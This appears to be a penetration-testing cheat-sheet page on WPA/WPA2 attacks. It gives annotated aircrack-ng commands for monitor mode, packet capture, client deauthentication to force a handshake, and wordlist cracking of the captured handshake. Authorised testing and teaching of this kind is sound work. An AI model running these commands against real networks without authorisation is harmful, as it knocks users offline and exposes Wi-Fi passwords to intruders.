---
title: "Wireless Techniques"
category: commands
order: 60
description: "Wireless penetration testing techniques."
tags: [wireless]
---

## WPA2

### WPA/WPA2 handshake capture & cracking (air toolset)

Use 'air toolset' to capture and crack WiFi handshakes

{% raw %}
```bash
# 1. kill processes that could interfere with the wireless card
airmon-ng check kill

# 2. put your wireless interface into monitor mode (often wlan0)
airmon-ng start §NIC§

# 3. capture packets and write them to a file - note the 'BSSID' and 'CHANNEL' of the target access point
airodump-ng --band abg -w capture_file §NIC§mon

# 4A. monitor a specific BSSID with a specific channel
sudo airodump-ng wlan0mon --bssid '{{BSSID}}' -w CAPTURED -c {{CHANNEL}}

# 4B. while running airodump-ng (4A), open a new terminal and deauthenticate a connected client to force a reauthentication
# add -c 'STATIONMAC' as additional option to deauth a specific client
sudo aireplay-ng -0 5 -a '{{BSSID}}' §NIC§mon

# 5. once a handshake is captured - you will see something like underneath in the top right corner: 
# 'WPA handshake: EE:55:B8:09:D4:A0' OR 'PMKID FOUND: EE:55:B8:09:D4:A0'

# 6. Try cracking the handshake with aircrack-ng and a wordlist (handshake is saved in the .cap file)
aircrack-ng -w /usr/share/wordlists/rockyou.txt CAPTURED-01.cap
```
{% endraw %}
